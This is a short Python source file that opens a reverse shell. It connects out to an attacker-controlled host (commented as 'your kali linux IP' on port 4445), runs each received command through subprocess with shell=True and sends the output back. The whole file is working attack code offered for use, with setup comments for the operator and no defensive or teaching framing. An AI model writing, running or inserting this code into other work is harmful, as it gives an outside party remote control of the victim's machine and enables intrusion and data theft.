import socket
import subprocess
import os 
kali_ip = " " # your kali linux IP
kali_port = 4445  # the port it coluld be change but i will recomand that the port is much higher 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((kali_ip, kali_port))

while True:
    command = s.recv(1024).decode("utf-8")
    if command.lower() == "exit":
        break

    try:
        if command.startswith("cd "):
            os.chdir(command[3:].strip())
            result = ""
        else:
            output = subprocess.run(command, shell=True, capture_output=True, text=True)
            result = output.stdout + output.stderr
    except Exception as e:
        result = str(e)

    current_dir = os.getcwd()
    message = result + "\n" + f"{current_dir}> "
    s.send(message.encode("utf-8"))
